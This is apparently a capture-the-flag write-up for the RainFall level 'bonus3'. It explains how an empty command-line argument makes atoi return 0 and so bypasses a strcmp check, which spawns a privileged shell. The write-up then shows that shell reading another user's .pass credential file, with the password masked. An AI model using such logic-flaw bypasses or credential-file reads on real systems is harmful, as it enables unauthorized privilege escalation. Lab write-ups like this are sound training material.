# BONUS3

# Analysis

We have a small program in which we can trigger a shell:
```
   0x080485eb <+247>:   movl   $0x8048707,0x4(%esp)    <====== sh
   0x080485f3 <+255>:   movl   $0x804870a,(%esp)          <====== /bin/sh
   0x080485fa <+262>:   call   0x8048420 <execl@plt>     <============= NEED TO GET HERE
```

## Solution

If we translate this program in C the solution is quite simple. You ned to get into the following if condition:
```
    if (strcmp(pass1, argv[1]) == 0) {
        execl("/bin/sh", "sh", NULL);
      }
``` 

Knowing that before that we have this instructions:
```
    index = atoi(argv[1]);
    pass1[index] = '\0';
```


So we need an pass1 and argv[1] to be similar for <strcmp> to return 0 and trigger <execl>. We control pass1 length because through index we can put a '\0' wherever we want. <atoi> returns 0 on error, so if we put an empty string as input, index will be 0, so pass1[0] = '\0', and an empty string is length 0 and is NULL terminated:

```bash
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```